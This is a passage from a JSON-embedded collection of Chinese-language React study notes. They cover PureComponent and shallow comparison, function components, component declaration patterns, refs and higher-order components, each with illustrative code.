Component\n\n```javascript\n// 普通 Component\nclass RegularComponent extends React.Component {\n  render() {\n    console.log(\"Regular Component render\");\n    return <div>{this.props.value}</div>;\n  }\n}\n\n// PureComponent\nclass PureComponentExample extends React.PureComponent {\n  render() {\n    console.log(\"Pure Component render\");\n    return <div>{this.props.value}</div>;\n  }\n}\n```\n\n### 3.1. 更新机制\n\n   - Component：默认情况下，**只要父组件重新渲染，组件就会重新渲染**\n   - PureComponent：**会对 props 和 state 进行浅比较，只有在数据真正发生变化时才重新渲染**\n\n### 3.2. 性能影响\n\n   - Component：可能导致不必要的重渲染\n   - PureComponent：通过**浅比较**避免不必要的重渲染，提高性能\n\n## 4. 浅比较的工作原理\n\n```javascript hl:10,12,20,22\nclass Example extends React.PureComponent {\n  state = {\n    data: { count: 0 },\n    array: [1, 2, 3],\n  };\n\n  // 浅比较的情况\n  goodUpdate = () => {\n    this.setState({\n      // 创建新对象，会触发重新渲染\n      data: { count: 1 },\n      // 创建新数组，会触发重新渲染\n      array: [...this.state.array, 4],\n    });\n  };\n\n  // 浅比较可能出问题的情况\n  problematicUpdate = () => {\n    const { data, array } = this.state;\n    // 直接修改对象，不会触发重新渲染\n    data.count = 1;\n    // 直接修改数组，不会触发重新渲染\n    array.push(4);\n    this.setState({ data, array });\n  };\n}\n\n```\n\n## 5. 使用场景和注意事项\n\n### 5.1. 适合使用 `PureComponent` 的场景\n\n```javascript\n// 展示型组件，props 是简单类型\nclass UserInfo extends React.PureComponent {\n  render() {\n    return (\n      <div>\n        <h2>{this.props.name}</h2>\n        <p>{this.props.email}</p>\n      </div>\n    );\n  }\n}\n```\n\n### 5.2. 不适合使用 `PureComponent` 的场景\n\n```javascript\n// 频繁更新的组件\nclass Timer extends React.Component { // 使用普通 Component\n  state = { time: new Date() };\n\n  componentDidMount() {\n    this.timer = setInterval(() => {\n      this.setState({ time: new Date() });\n    }, 1000);\n  }\n\n  componentWillUnmount() {\n    clearInterval(this.timer);\n  }\n\n  render() {\n    return <div>{this.state.time.toLocaleTimeString()}</div>;\n  }\n}\n```\n\n## 6. 在函数组件中的等效实现\n\n在函数组件中，我们使用 **React.memo 来实现类似 PureComponent 的功能**：\n\n```javascript hl:11,22\n// 使用 React.memo 创建类似 PureComponent 的效果\nconst MemoizedComponent = React.memo(function UserInfo({ name, email }) {\n  return (\n    <div>\n      <h2>{name}</h2>\n      <p>{email}</p>\n    </div>\n  );\n});\n\n// 自定义比较逻辑\nconst CustomMemoized = React.memo(\n  function UserInfo({ user }) {\n    return (\n      <div>\n        <h2>{user.name}</h2>\n        <p>{user.email}</p>\n      </div>\n    );\n  },\n  (prevProps, nextProps) => {\n    // 返回 true 则不重新渲染\n    return prevProps.user.id === nextProps.user.id;\n  }\n);\n```\n\n## 7. 常见陷阱和优化\n\n### 7.1. 对象属性的问题\n\n> [!danger]\n> 关键的， `style={{ color: 'red' }}` 不好！\n\n```javascript hl:3\nclass Parent extends React.Component {\n  render() {\n    // 不好的做法：每次渲染都创建新对象\n    return <PureChild style={{ color: 'red' }} />;\n\n    // 好的做法：将对象提到组件外部或使用 useMemo\n    return <PureChild style={styles} />;\n  }\n}\n\nconst styles = { color: 'red' };\n```\n\n### 7.2. 数组属性的处理\n\n```javascript hl:7,16\nclass ListComponent extends React.PureComponent {\n  render() {\n    const { items } = this.props;\n    \n    return (\n      <ul>\n        {/* 不好的做法：map 创建新数组 */}\n        {items.map((item, index) => (\n          <li key={index}>{item}</li>\n        ))}\n      </ul>\n    );\n  }\n}\n\n// 优化：将 map 结果缓存\nclass OptimizedList extends React.PureComponent {\n  memoizedItems = null;\n  \n  getMemoizedItems(items) {\n    if (!this.memoizedItems || this.props.items !== items) {\n      this.memoizedItems = items.map((item, index) => (\n        <li key={index}>{item}</li>\n      ));\n    }\n    return this.memoizedItems;\n  }\n\n  render() {\n    return <ul>{this.getMemoizedItems(this.props.items)}</ul>;\n  }\n}\n```\n\n### 7.3. 函数属性的处理\n\n```javascript hl:9,12\nclass Parent extends React.Component {\n  // 好的做法：使用类方法\n  handleClick = () => {\n    // 处理点击\n  };\n\n  render() {\n    return (\n      // 不好的做法：内联函数会导致 PureComponent 失效\n      <PureChild onClick={() => this.handleClick()} />\n      \n      // 好的做法：传递类方法引用\n      <PureChild onClick={this.handleClick} />\n    );\n  }\n}\n```\n\n","xltBsLlH":"\n# 无状态组件（Stateless Component）概念、原理及最佳实践\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 无状态组件 === 函数式组件\n- 优势：\n\t- 更少的内存占用，性能优势、代码简洁性\n- 缺陷：\n\t- 无法使用生命周期方法、不能维护内部状态、不支持复杂组件功能等\n\t- 但通过 React Hooks，无状态组件的大部分缺陷都可以得到解决，推荐在现代React开发中使用==函数组件 + Hooks的组合==。\n- 条件渲染\n\t- `if` 或者 `&&`\n- 性能优化思路\n\t- 使用 React.memo 包装\n\t- 内联对象 → 提取常量\n\t- 事件回调 → 使用 usecallback\n\t- 复杂计算：使用 useMemo 缓存结果\n\t- 样式\n\t\t- 使用 className  \n\t\t- 或者 style 提出变量\n\n## 2. 什么是无状态组件\n\n无状态组件（也叫**函数式组件**）是最简单的 React 组件形式，它们是**纯函数**\n- 接收 props 并返回 React 元素\n- **不包含内部状态、生命周期方法和 this 引用。**\n\n## 3. 基本语法\n\n```jsx\n// 1. 最基本的无状态组件\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n\n// 2. 箭头函数形式\nconst Welcome = (props) => <h1>Hello, {props.name}</h1>;\n\n// 3. 使用解构的形式\nconst Welcome = ({ name, age }) => (\n  <div>\n    <h1>Hello, {name}</h1>\n    <p>Age: {age}</p>\n  </div>\n);\n```\n\n## 4. 特点和优势\n\n### 4.1. 性能优势\n\n```jsx\n// 无状态组件\nconst PureDisplay = ({ text }) => <div>{text}</div>;\n\n// 等效的类组件\nclass DisplayComponent extends React.Component {\n  render() {\n    return <div>{this.props.text}</div>;\n  }\n}\n```\n\n主要优势：\n- 更少的内存占用\n\t- **因为没有实例创建**\n- 更快的渲染速度\n- 更容易测试和维护\n\n### 4.2. 代码简洁\n\n```jsx\n// 无状态组件：简洁明了\nconst UserCard = ({ name, email, avatar }) => (\n  <div className=\"user-card\">\n    <img src={avatar} alt={name} />\n    <h2>{name}</h2>\n    <p>{email}</p>\n  </div>\n);\n\n// 类组件：相对冗长\nclass UserCard extends React.Component {\n  render() {\n    const { name, email, avatar } = this.props;\n    return (\n      <div className=\"user-card\">\n        <img src={avatar} alt={name} />\n        <h2>{name}</h2>\n        <p>{email}</p>\n      </div>\n    );\n  }\n}\n```\n\n## 5. 最佳实践\n\n### 5.1. Props 的==默认值==处理\n\n> 两种方式\n\n```jsx\n// 方式1：使用默认参数\nconst Button = ({ text = 'Click me', onClick = () => {} }) => (\n  <button onClick={onClick}>{text}</button>\n);\n\n// 方式2：使用 defaultProps\nconst Button = ({ text, onClick }) => (\n  <button onClick={onClick}>{text}</button>\n);\n\nButton.defaultProps = {\n  text: 'Click me',\n  onClick: () => {}\n};\n```\n\n### 5.2. Props 类型检查\n\n```jsx\nimport PropTypes from 'prop-types';\n\nconst UserProfile = ({ name, age, email }) => (\n  <div>\n    <h2>{name}</h2>\n    <p>Age: {age}</p>\n    <p>Email: {email}</p>\n  </div>\n);\n\nUserProfile.propTypes = {\n  name: PropTypes.string.isRequired,\n  age: PropTypes.number,\n  email: PropTypes.string.isRequired\n};\n```\n\n### 5.3. 条件渲染\n\n```jsx\nconst ConditionalComponent = ({ isLoggedIn, userData }) => (\n  <div>\n    {isLoggedIn ? (\n      <UserDashboard data={userData} />\n    ) : (\n      <LoginPrompt />\n    )}\n  </div>\n);\n\n// 使用 && 运算符\nconst Notification = ({ message }) => (\n  <div>\n    {message && <div className=\"alert\">{message}</div>}\n  </div>\n);\n```\n\n## 6. 组合模式\n\n### 6.1. 组件组合\n\n```jsx\n// 小型可复用组件\nconst Avatar = ({ src, alt }) => (\n  <img src={src} alt={alt} className=\"avatar\" />\n);\n\nconst UserInfo = ({ name, title }) => (\n  <div className=\"user-info\">\n    <h3>{name}</h3>\n    <p>{title}</p>\n  </div>\n);\n\n// 组合使用\nconst UserCard = ({ user }) => (\n  <div className=\"user-card\">\n    <Avatar src={user.avatarUrl} alt={user.name} />\n    <UserInfo name={user.name} title={user.title} />\n  </div>\n);\n```\n\n### 6.2. 渲染属性模式\n\n```jsx\nconst WithTooltip = ({ children, tooltip }) => (\n  <div className=\"tooltip-wrapper\">\n    {children}\n    <span className=\"tooltip\">{tooltip}</span>\n  </div>\n);\n\nconst Button = () => (\n  <WithTooltip tooltip=\"Click to submit\">\n    <button>Submit</button>\n  </WithTooltip>\n);\n```\n\n## 7. 性能优化\n\n### 7.1. 使用 React.memo\n\n```jsx\nconst ExpensiveComponent = React.memo(({ data }) => (\n  <div>\n    {/* 复杂的渲染逻辑 */}\n    {data.map(item => (\n      <ComplexItem key={item.id} {...item} />\n    ))}\n  </div>\n));\n\n// 自定义比较函数\nconst MemoizedComponent = React.memo(\n  ({ value }) => <div>{value}</div>,\n  (prevProps, nextProps) => {\n    return prevProps.value === nextProps.value;\n  }\n);\n```\n\n### 7.2. 避免不必要的渲染\n\n```jsx hl:1,9\n// 不好的做法：内联对象\nconst BadExample = () => (\n  <UserCard\n    style={{ margin: '10px' }} // 每次渲染都创建新对象\n    data={{ id: 1, name: 'John' }}\n  />\n);\n\n// 好的做法：提取常量\nconst cardStyle = { margin: '10px' };\nconst userData = { id: 1, name: 'John' };\n\nconst GoodExample = () => (\n  <UserCard\n    style={cardStyle}\n    data={userData}\n  />\n);\n```\n\n## 8. 常见问题和解决方案\n\n### 8.1. 处理事件\n\n```jsx hl:12,1,8,3\n// 不好的做法：每次渲染创建新函数\nconst BadButton = ({ onClick, text }) => (\n  <button onClick={(e) => onClick(e, text)}>\n    {text}\n  </button>\n);\n\n// 好的做法：使用 useCallback\nimport { useCallback } from 'react';\n\nconst GoodButton = ({ onClick, text }) => {\n  const handleClick = useCallback((e) => {\n    onClick(e, text);\n  }, [onClick, text]);\n\n  return (\n    <button onClick={handleClick}>\n      {text}\n    </button>\n  );\n};\n```\n\n### 8.2. 复杂计算：使用 useMemo 缓存结果\n\n```jsx\nimport { useMemo } from 'react';\n\nconst DataDisplay = ({ items }) => {\n  // 使用 useMemo 缓存计算结果\n  const processedData = useMemo(() => {\n    return items.map(item => ({\n      ...item,\n      processed: expensiveOperation(item)\n    }));\n  }, [items]);\n\n  return (\n    <ul>\n      {processedData.map(item => (\n        <li key={item.id}>{item.processed}</li>\n      ))}\n    </ul>\n  );\n};\n```\n\n### 8.3. 样式处理\n\n```jsx\n// CSS-in-JS\nconst StyledButton = ({ primary, children }) => (\n  <button\n    style={{\n      backgroundColor: primary ? 'blue' : 'gray',\n      color: 'white',\n      padding: '10px 20px',\n      border: 'none',\n      borderRadius: '4px'\n    }}\n  >\n    {children}\n  </button>\n);\n\n// 使用 className\nconst Button = ({ type, children }) => (\n  <button className={`btn btn-${type}`}>\n    {children}\n  </button>\n);\n```\n\n## 9. 无状态组件的主要缺陷\n\n1. 无法使用生命周期方法\n2. 不能维护内部状态\n3. 难以实现复杂交互逻辑\n4. 性能优化受限\n5. Refs 使用受限\n6. 缺少实例方法，比如无法像 class 那样调用方法\n\n但是**通过 React Hooks，这些问题大多可以得到解决**，而且能够保持代码的简洁性和函数式编程的优势。\n\n在现代 React 开发中，推荐使用**函数组件 + Hooks 的组合**来构建应用。\n\n","N8xqaCi9":"\n# React 组件的各种定义和声明方式\n\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 简单的展示型组件\n\t- 使用函数式组件\n- 需要状态管理和生命周期的\n\t- 使用 **类组件或 Hooks**\n- 需要==复用==逻辑的\n\t- 使用**高阶组件或自定义 Hooks**\n- 需要性能优化的\n\t- 使用 `React.memo` 或 `PureComponent`\n- 需要代码分割的\n\t- 使用 `React.lazy` 和 `Suspense`\n\n## 2. 函数式组件（Function Component）\n\n```jsx\n// 1.1 普通函数声明\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n\n// 1.2 箭头函数声明\nconst Welcome = (props) => {\n  return <h1>Hello, {props.name}</h1>;\n};\n\n// 1.3 箭头函数简写（单行返回）\nconst Welcome = props => <h1>Hello, {props.name}</h1>;\n\n// 1.4 使用解构的箭头函数\nconst Welcome = ({ name, age }) => (\n  <div>\n    <h1>Hello, {name}</h1>\n    <p>Age: {age}</p>\n  </div>\n);\n```\n\n## 3. 类组件（Class Component）\n\n```jsx hl:1,8,15\n// 2.1 基础类组件\nclass Welcome extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n\n// 2.2 使用 React.PureComponent\nclass PureWelcome extends React.PureComponent {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n\n// 2.3 使用 class fields\nclass ModernWelcome extends React.Component {\n  state = {\n    count: 0\n  };\n\n  handleClick = () => {\n    this.setState(state => ({ count: state.count + 1 }));\n  };\n\n  render() {\n    return (\n      <div>\n        <h1>Hello, {this.props.name}</h1>\n        <button onClick={this.handleClick}>\n          Count: {this.state.count}\n        </button>\n      </div>\n    );\n  }\n}\n```\n\n## 4. 高阶组件（HOC）\n\n```jsx\n// 3.1 基本的高阶组件\nconst withLogger = (WrappedComponent) => {\n  return class extends React.Component {\n    componentDidMount() {\n      console.log('Component mounted');\n    }\n\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  };\n};\n\n// 使用高阶组件\nconst LoggedWelcome = withLogger(Welcome);\n\n// 3.2 带参数的高阶组件\nconst withData = (dataSource) => (WrappedComponent) => {\n  return class extends React.Component {\n    state = {\n      data: null\n    };\n\n    componentDidMount() {\n      this.fetchData();\n    }\n\n    fetchData = async () => {\n      const data = await dataSource();\n      this.setState({ data });\n    };\n\n    render() {\n      return (\n        <WrappedComponent\n          data={this.state.data}\n          {...this.props}\n        />\n      );\n    }\n  };\n};\n```\n\n## 5. Render Props 模式\n\n```jsx\n// 4.1 基本的 Render Props\nclass MouseTracker extends React.Component {\n  state = { x: 0, y: 0 };\n\n  handleMouseMove = (event) => {\n    this.setState({\n      x: event.clientX,\n      y: event.clientY\n    });\n  };\n\n  render() {\n    return (\n      <div onMouseMove={this.handleMouseMove}>\n        {this.props.render(this.state)}\n      </div>\n    );\n  }\n}\n\n// 使用 Render Props\n<MouseTracker\n  render={({ x, y }) => (\n    <h1>Mouse position: {x}, {y}</h1>\n  )}\n/>\n\n// 4.2 使用 children 作为函数\nclass MouseTracker extends React.Component {\n  // ... 同上\n  render() {\n    return (\n      <div onMouseMove={this.handleMouseMove}>\n        {this.props.children(this.state)}\n      </div>\n    );\n  }\n}\n```\n\n## 6. 使用 Hooks 的函数组件\n\n```jsx\n// 5.1 使用多个 Hooks\nconst UserProfile = ({ userId }) => {\n  const [user, setUser] = useState(null);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    fetchUser(userId).then(data => {\n      setUser(data);\n      setLoading(false);\n    });\n  }, [userId]);\n\n  if (loading) return <div>Loading...</div>;\n  return <div>Welcome {user.name}</div>;\n};\n\n// 5.2 自定义 Hook\nconst useWindowSize = () => {\n  const [size, setSize] = useState({\n    width: window.innerWidth,\n    height: window.innerHeight\n  });\n\n  useEffect(() => {\n    const handleResize = () => {\n      setSize({\n        width: window.innerWidth,\n        height: window.innerHeight\n      });\n    };\n\n    window.addEventListener('resize', handleResize);\n    return () => window.removeEventListener('resize', handleResize);\n  }, []);\n\n  return size;\n};\n\n// 使用自定义 Hook\nconst ResponsiveComponent = () => {\n  const { width, height } = useWindowSize();\n  return <div>Window size: {width} x {height}</div>;\n};\n```\n\n## 7. React.memo 组件\n\n```jsx hl:1,6\n// 6.1 基本的 Memo 组件\nconst MemoizedComponent = React.memo(function MyComponent(props) {\n  return <div>{props.value}</div>;\n});\n\n// 6.2 带有比较函数的 Memo 组件\nconst MemoizedComponent = React.memo(\n  function MyComponent(props) {\n    return <div>{props.value}</div>;\n  },\n  (prevProps, nextProps) => {\n    return prevProps.value === nextProps.value;\n  }\n);\n```\n\n## 8. 动态组件 & 异步组件\n\n```jsx hl:1,13\n// 7.1 使用条件渲染创建动态组件\nconst DynamicComponent = ({ type, ...props }) => {\n  const components = {\n    text: TextComponent,\n    image: ImageComponent,\n    video: VideoComponent\n  };\n\n  const Component = components[type];\n  return Component ? <Component {...props} /> : null;\n};\n\n// 7.2 使用 lazy 和 Suspense 进行代码分割\nconst LazyComponent = React.lazy(() => import('./LazyComponent'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<div>Loading...</div>}>\n      <LazyComponent />\n    </Suspense>\n  );\n}\n```\n\n\n\n","iBEkY5Fl":"\n# React 中获取 DOM 引用的方式\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n1. 优先使用 `useRef` 和 `createRef`\n2. 需要更细粒度控制时使用 `回调refs`\n3. 需要**跨组件传递 ref 时**使用 `forwardRef`\n4. 尽量避免使用`字符串 refs` 和 `findDOMNode`\n5. 只在必要时使用 refs（如焦点管理、动画、第三方 DOM 库集成等）\n6. 不要过度使用 refs 来操作 DOM，尽量通过 React 的声明式更新来管理 UI\n\n## 2. React.createRef()\n\n最新推荐的创建 ref 的方式：\n\n```jsx hl:5\n// 1.1 在类组件中使用\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.myRef = React.createRef();\n  }\n\n  componentDidMount() {\n    // 访问 DOM 节点\n    console.log(this.myRef.current);\n  }\n\n  render() {\n    return <div ref={this.myRef}>Hello</div>;\n  }\n}\n\n// 1.2 在类组件中使用 class fields\nclass MyComponent extends React.Component {\n  myRef = React.createRef();\n\n  handleClick = () => {\n    // 访问 DOM 节点\n    this.myRef.current.focus();\n  };\n\n  render() {\n    return (\n      <>\n        <input ref={this.myRef} />\n        <button onClick={this.handleClick}>Focus Input</button>\n      </>\n    );\n  }\n}\n```\n\n## 3. useRef Hook\n\n在函数组件中使用的 Hook 方式：\n\n```jsx\n// 2.1 基本用法\nfunction TextInputWithFocusButton() {\n  const inputRef = useRef(null);\n\n  const focusInput = () => {\n    inputRef.current.focus();\n  };\n\n  return (\n    <>\n      <input ref={inputRef} type=\"text\" />\n      <button onClick={focusInput}>Focus Input</button>\n    </>\n  );\n}\n\n// 2.2 多个 ref 的使用\nfunction MultipleRefs() {\n  const firstRef = useRef(null);\n  const secondRef = useRef(null);\n  const thirdRef = useRef(null);\n\n  const handleClick = (ref) => {\n    ref.current.scrollIntoView({ behavior: 'smooth' });\n  };\n\n  return (\n    <div>\n      <button onClick={() => handleClick(firstRef)}>Scroll to First</button>\n      <button onClick={() => handleClick(secondRef)}>Scroll to Second</button>\n      <button onClick={() => handleClick(thirdRef)}>Scroll to Third</button>\n      \n      <div ref={firstRef}>First Element</div>\n      <div ref={secondRef}>Second Element</div>\n      <div ref={thirdRef}>Third Element</div>\n    </div>\n  );\n}\n```\n\n## 4. 回调 Refs（Callback Refs）\n\n通过回调函数的方式设置 ref：\n\n```jsx hl:1,22,15,36\n// 3.1 基本用法\nclass CallbackRefComponent extends React.Component {\n  setTextInputRef = (element) => {\n    this.textInput = element;\n  };\n\n  focusTextInput = () => {\n    // 直接使用 DOM API\n    if (this.textInput) this.textInput.focus();\n  };\n\n  render() {\n    return (\n      <>\n        <input type=\"text\" ref={this.setTextInputRef} />\n        <button onClick={this.focusTextInput}>Focus Input</button>\n      </>\n    );\n  }\n}\n\n// 3.2 在函数组件中使用\nfunction CallbackRefFunctional() {\n  let textInput = null;\n\n  const setTextInputRef = (element) => {\n    textInput = element;\n  };\n\n  const focusTextInput = () => {\n    if (textInput) textInput.focus();\n  };\n\n  return (\n    <>\n      <input ref={setTextInputRef} />\n      <button onClick={focusTextInput}>Focus Input</button>\n    </>\n  );\n}\n```\n\n## 5. forwardRef\n\n用于**转发 refs 到子组件**：\n\n```jsx\n// 4.1 基本用法\nconst FancyButton = React.forwardRef((props, ref) => (\n  <button ref={ref} className=\"fancy-button\">\n    {props.children}\n  </button>\n));\n\n// 使用 FancyButton\nfunction Parent() {\n  const buttonRef = useRef(null);\n\n  return <FancyButton ref={buttonRef}>Click me!</FancyButton>;\n}\n\n// 4.2 带有 HOC 的 forwardRef\nconst withLogger = (WrappedComponent) => {\n  return React.forwardRef((props, ref) => {\n    useEffect(() => {\n      console.log('Component mounted');\n    }, []);\n\n    return <WrappedComponent {...props} ref={ref} />;\n  });\n};\n\nconst LoggedButton = withLogger(FancyButton);\n```\n\n## 6. 字符串 Refs（不推荐）\n\n旧版本的 ref 方式，现已不推荐使用：\n\n```jsx hl:5\n// 不推荐使用的字符串 ref\nclass LegacyComponent extends React.Component {\n  componentDidMount() {\n    // 不推荐\n    this.refs.myInput.focus();\n  }\n\n  render() {\n    return <input ref=\"myInput\" />;\n  }\n}\n```\n\n## 7. findDOMNode（不推荐）\n\nlegacy API，在严格模式下会警告：\n\n```jsx\n// 不推荐使用 findDOMNode\nclass LegacyFindDOMNode extends React.Component {\n  componentDidMount() {\n    // 不推荐\n    const node = ReactDOM.findDOMNode(this);\n  }\n\n  render() {\n    return <div>Legacy</div>;\n  }\n}\n```\n\n## 8. 实际应用示例\n\n```jsx\n// 7.1 复杂表单处理\nfunction ComplexForm() {\n  const formRefs = {\n    name: useRef(null),\n    email: useRef(null),\n    phone: useRef(null)\n  };\n\n  const validateField = (fieldName) => {\n    const value = formRefs[fieldName].current.value;\n    // 验证逻辑\n  };\n\n  return (\n    <form>\n      <input ref={formRefs.name} placeholder=\"Name\" />\n      <input ref={formRefs.email} type=\"email\" placeholder=\"Email\" />\n      <input ref={formRefs.phone} placeholder=\"Phone\" />\n    </form>\n  );\n}\n\n// 7.2 媒体播放器\nfunction VideoPlayer({ src }) {\n  const videoRef = useRef(null);\n\n  const handlePlay = () => {\n    videoRef.current.play();\n  };\n\n  const handlePause = () => {\n    videoRef.current.pause();\n  };\n\n  return (\n    <div>\n      <video ref={videoRef} src={src} />\n      <button onClick={handlePlay}>Play</button>\n      <button onClick={handlePause}>Pause</button>\n    </div>\n  );\n}\n```\n\n","QuDiAmjk":"\n# 高阶组件（HOC）\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 高阶组件==本质是==一个函数，接收一个组件作为参数，返回一个新的==增强组件==\n- 使用场景\n\t- 属性代理：`withExtraProps`\n\t- 条件渲染：权限控制\n\t\t- 比如 withAuth\n\t- withState 状态\n\t- withLogger\n\t- React.memo 本质也是 HOC\n\t- withData 数据获取\n\t- withStyles \n\t- `withFetch(url)`\n- 注意事项\n\t- ==组合而非修改==\n\t- 不要在 render 中使用 hoc\n\t- 静态方法会丢失\n\t- 可使用 compose 组合多个 HOC\n- hoist-non-react-statics\n\t- JavaScript 中，静态方法是定义在类本身上，而不是类的原型上\n\t\t- 当我们创建一个新的组件类来包装原始组件时，这个==新类并不会自动继承原始组件的静态方法== \n- 使用组合而不是继承\n\t- 在现代 React 开发中，**Hooks 通常是更简单和灵活的选择**\n\n## 2. 什么是高阶组件\n\n高阶组件是一个函数，接收一个组件作为参数，返回一个新的增强组件。这是一种基于 React 组合特性的组件**复用**技术\n\n```jsx\n// 基本的 HOC 结构\nconst withExample = (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n}\n// 使用 HOC\nconst EnhancedComponent = withExample(OriginalComponent);\n```\n\n## 3. 常见使用场景\n\n### 3.1. 属性代理\n\n```jsx\n// 添加额外的 props\nconst withExtraProps = (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      const newProps = {\n        extraProp: 'Extra Property'\n      };\n      return <WrappedComponent {...this.props} {...newProps} />;\n    }\n  }\n}\n\n// 使用示例\nconst MyComponent = ({ extraProp }) => (\n  <div>{extraProp}</div>\n);\n\nconst Enhanced = withExtraProps(MyComponent);\n```\n\n### 3.2. 条件渲染：权限控制\n\n```jsx \n// 权限控制 HOC\nconst withAuth = (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      if (!this.props.isAuthenticated) {\n        return <Navigate to=\"/login\" />;\n      }\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n}\n\n// 加载状态 HOC\nconst withLoading = (WrappedComponent) => {\n  return function({ isLoading, ...props }) {\n    if (isLoading) {\n      return <div>Loading...</div>;\n    }\n    return <WrappedComponent {...props} />;\n  }\n}\n```\n\n### 3.3. 状态管理\n\n```jsx\n// 添加本地状态管理\nconst withState = (WrappedComponent) => {\n  return class extends React.Component {\n    state = {\n      count: 0\n    };\n    increment = () => {\n      this.setState(prev => ({ count: prev.count + 1 }));\n    };\n    render() {\n      return (\n        <WrappedComponent\n          {...this.props}\n          count={this.state.count}\n          onIncrement={this.increment}\n        />\n      );\n    }\n  }\n}\n```\n\n### 3.4. 日志记录\n\n```jsx\n// 组件生命周期日志\nconst withLogger = (WrappedComponent) => {\n  return class extends React.Component {\n    componentDidMount() {\n      console.log(`${WrappedComponent.name} mounted`);\n    }\n\n    componentWillUnmount() {\n      console.log(`${WrappedComponent.name} will unmount`);\n    }\n\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n}\n```\n\n### 3.5. 性能优化：React.memo\n\n```jsx\n// 添加性能优化\nconst withMemo = (WrappedComponent) => {\n  return React.memo(WrappedComponent, (prevProps, nextProps) => {\n    // 自定义比较逻辑\n    return prevProps.value === nextProps.value;\n  });\n}\n```\n\n### 3.6. **数据获取和加载状态**\n\n```javascript hl:11\nconst withData = (dataSource) => (WrappedComponent) => {\n  return class extends React.Component {\n    state = {\n      data: null,\n      loading: true,\n      error: null\n    };\n\n    async componentDidMount() {\n      try {\n        const data = await dataSource();\n        this.setState({ data, loading: false });\n      } catch (error) {\n        this.setState({ error, loading: false });\n      }\n    }\n\n    render() {\n      const { data, loading, error } = this.state;\n      return (\n        <WrappedComponent\n          data={data}\n          loading={loading}\n          error={error}\n          {...this.props}\n        />\n      );\n    }\n  };\n};\n```\n\n### 3.7. **样式注入**\n\n```javascript\nconst withStyles = (styles) => (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      return (\n        <div style={styles}>\n          <WrappedComponent {...this.props} />\n        </div>\n      );\n    }\n  };\n};\n```\n\n## 4. 复杂示例\n\n### 4.1. 组合多个 HOC：compose\n\n```jsx\n// HOC 组合\nconst compose = (...funcs) => x => funcs.reduceRight((v, f) => f(v), x);\n\nconst enhance = compose(\n  withAuth,\n  withLogger,\n  withState,\n  withLoading\n);\n\nconst EnhancedComponent = enhance(BaseComponent);\n```\n\n### 4.2. 带参数的 HOC：带参数 `url`\n\n```jsx\nconst withFetch = (url) => (WrappedComponent) => {\n  return class extends React.Component {\n    state = {\n      data: null,\n      loading: true,\n      error: null\n    };\n\n    componentDidMount() {\n      this.fetchData();\n    }\n\n    fetchData = async () => {\n      try {\n        const response = await fetch(url);\n        const data = await response.json();\n        this.setState({ data, loading: false });\n      } catch (error) {\n        this.setState({ error, loading: false });\n      }\n    };\n\n    render() {\n      const { data, loading, error } = this.state;\n      return (\n        <WrappedComponent\n          {...this.props}\n          data={data}\n          loading={loading}\n          error={error}\n        />\n      );\n    }\n  };\n};\n\n// 使用\nconst UserList = withFetch('https://api.example.com/users')(UserComponent);\n```\n\n## 5. 注意事项\n\n### 5.1. 不要在 render 方法中使用 HOC\n\n```jsx\n// ❌ 错误示例\nclass Example extends React.Component {\n  render() {\n    // 每次渲染都会创建新的组件实例\n    const EnhancedComponent = withExample(MyComponent);\n    return <EnhancedComponent />;\n  }\n}\n\n// ✅ 正确示例\nconst EnhancedComponent = withExample(MyComponent);\nclass Example extends React.Component {\n  render() {\n    return <EnhancedComponent />;\n  }\n}\n```\n\n### 5.2. 复制静态方法\n\n```javascript\nimport hoistNonReactStatics from 'hoist-non-react-statics';\n\nfunction withExample(WrappedComponent) {\n  class WithExample extends React.Component {\n    /* ... */\n  }\n  \n  // 复制静态方法\n  hoistNonReactStatics(WithExample, WrappedComponent);\n  return WithExample;\n}\n```\n\n### 5.3. **命名约定**\n\n```javascript\n// 为 HOC 添加显示名称以便调试\nfunction withExample(WrappedComponent) {\n  class WithExample extends React.Component {/* ... */}\n  \n  // 设置有意义的显示名称\n  WithExample.displayName = `WithExample(${getDisplayName(WrappedComponent)})`;\n  return WithExample;\n}\n\nfunction getDisplayName(WrappedComponent) {\n  return WrappedComponent.displayName || WrappedComponent.name || 'Component';\n}\n```\n\n### 5.4. 传递 Refs\n\n```jsx\nconst withRef = (WrappedComponent) => {\n  return React.forwardRef((props, ref) => {\n    return <WrappedComponent {...props} forwardedRef={ref} />;\n  });\n}\n```\n\n## 6. 最佳实践\n\n### 6.1. **命名约定**\n\n```jsx\n// 使用 with 前缀\nconst withAuth = (WrappedComponent) => {\n  // HOC 实现\n};\n\n// 为 HOC 包装的组件设置显示名称\nconst getDisplayName = (WrappedComponent) => {\n  return WrappedComponent.displayName || WrappedComponent.name || 'Component';\n};\n\nHOC.displayName = `WithAuth(${getDisplayName(WrappedComponent)})`;\n```\n\n### 6.2. **解构 props**\n\n```jsx\nconst withExample = (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      const { specialProp, ...passThroughProps } = this.props;\n      return <WrappedComponent {...passThroughProps} />;\n    }\n  }\n}\n```\n\n### 6.3. **组合而非修改**\n\n```jsx\n// ❌ 错误示例：直接修改原组件\nconst withExample = (WrappedComponent) => {\n  WrappedComponent.prototype.componentDidMount = function() {\n    // 某些操作\n  };\n  return WrappedComponent;\n};\n\n// ✅ 正确示例：使用组合\nconst withExample = (WrappedComponent) => {\n  return class extends React.Component {\n    componentDidMount() {\n      